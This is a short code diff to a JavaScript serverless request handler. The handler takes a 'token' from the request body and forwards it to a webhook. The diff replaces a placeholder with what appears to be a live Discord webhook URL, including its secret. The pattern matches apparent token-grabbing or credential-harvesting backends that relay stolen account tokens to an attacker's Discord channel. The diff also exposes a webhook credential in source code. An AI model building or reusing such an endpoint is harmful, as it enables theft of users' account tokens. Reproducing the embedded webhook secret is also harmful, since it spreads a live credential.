@@ -4,7 +4,7 @@ export default async function handler(req, res) {
     const { token } = req.body;
 
     // Your webhook URL (replace with the actual webhook URL)
-    const webhookURL = 'https://your-webhook-url.com';
+    const webhookURL = 'https://discord.com/api/webhooks/1333612145115664394/qAG8XiHS0hI9TfNqR2jKViMZ4vZDd_H0Dr7caazZ0Y0LNL_sA9P2rfPvtRgqhr2ZtvYN';
 
     try {
       // Send the token to your webhook
